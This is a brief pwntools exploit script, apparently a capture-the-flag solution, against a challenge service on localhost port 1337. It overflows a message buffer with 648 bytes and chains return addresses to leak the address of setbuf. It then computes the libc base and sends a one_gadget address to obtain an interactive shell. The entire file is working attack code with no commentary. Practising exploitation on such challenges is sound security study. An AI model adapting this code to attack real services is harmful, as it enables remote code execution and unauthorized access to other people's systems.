#!/usr/bin/env python3

from pwn import *
context(os="linux", arch="amd64")
r = connect("localhost", "1337") 
libc = ELF("./libc-2.27.so")
r.recvuntil(b"NUMBER> ")
r.sendline(b"1234")
r.recvuntil(b"NAME> ")
r.sendline(b"x"*99)
r.recvuntil(b"MESSAGE> ")
buf = b"Z"*648
buf += p64(0x4008d3)
buf += p64(0x400867)
r.sendline(buf) 
r.recvline()
setbuf_leak = int(r.recvline(), 16)
libc.address = setbuf_leak - libc.sym.setbuf
offset = 0x10a2fc
one_gadget = libc.address + offset
r.sendline(p64(one_gadget))
r.interactive()
